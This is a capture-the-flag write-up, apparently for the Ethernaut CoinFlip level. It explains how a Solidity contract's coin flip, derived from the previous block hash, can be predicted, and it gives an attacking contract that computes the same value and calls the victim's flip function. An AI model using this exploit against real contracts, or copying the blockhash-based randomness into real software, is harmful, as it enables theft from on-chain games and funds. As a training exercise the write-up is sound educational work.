# CoinFlip   
This challenge presents us with a smart contract that simulates a coin flip challenge. We have to guess the correct outcome 10 times in a row to win the game. If we fail, the counter resets to 0.

But how can we do this? 🤔 Well, there are two main components we need to focus on: the `FACTOR` variable and the `flip` function.

`FACTOR` is a predefined value used to determine the coin flip outcome.   
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
The `flip` function uses the hash of the previous block (`blockhash(block.number - 1)`) to determine the coin flip result.
The result is derived by dividing the block hash by `FACTOR`. If the result is 1, it's heads (`true`); otherwise, tails (`false`).
If the player's guess matches the result, `consecutiveWins` increments; otherwise, it resets to 0.
Since the result is based on publicly available blockchain data (the previous block's hash), we can predict the outcome and always guess correctly.
I created the following contract to solve this challenge (we need to call the `attack` function 10 times):  
```solidity
//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

contract AttackContract {
    uint256 FACTOR;
    address victim;

    constructor() {
        FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        victim = // the address of the instance;
    }

    function attack() public {
        (bool success, ) = victim.call(
            abi.encodeWithSignature("flip(bool)", flip())
        );
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}
```
